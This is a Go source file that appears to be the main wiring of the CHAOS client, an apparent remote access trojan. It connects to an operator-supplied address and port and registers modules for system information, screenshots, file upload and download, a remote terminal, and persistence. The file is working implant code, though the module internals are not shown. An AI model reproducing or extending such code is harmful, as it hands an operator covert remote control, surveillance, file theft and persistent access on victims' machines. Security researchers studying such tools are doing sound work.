package app

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/handler/connection"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/download"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/information"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/persistence"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/terminal"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/upload"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
)

type App struct {
	Handler handler.Handler
}

func NewApp(address, port, binaryPath string) (*App, error) {
	conn, err := network.NewConnection(address, port)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error creating new connection")
		return nil, err
	}

	// Use Case
	informationUseCase := information.NewInformationUseCase(conn)
	screenshotUseCase := screenshot.NewScreenshotUseCase(conn)
	downloadUseCase := download.NewDownloadUseCase(conn)
	uploadUseCase := upload.NewUploadUseCase(conn)
	terminalUseCase := terminal.NewTerminalUseCase(conn)
	persistenceUseCase := persistence.NewPersistenceUseCase(conn, binaryPath)

	useCase := usecase.UseCase{
		Information: informationUseCase,
		Screenshot:  screenshotUseCase,
		Download:    downloadUseCase,
		Upload:      uploadUseCase,
		Terminal:    terminalUseCase,
		Persistence: persistenceUseCase,
	}

	connectionHandler := connection.NewConnectionHandler(conn, &useCase)

	return &App{
		Handler: connectionHandler,
	}, nil
}

func (app *App) Run() error {
	if err := app.Handler.Handle(); err != nil {
		log.WithField("cause", err.Error()).Error("error handling app connection")
		return err
	}
	return nil
}
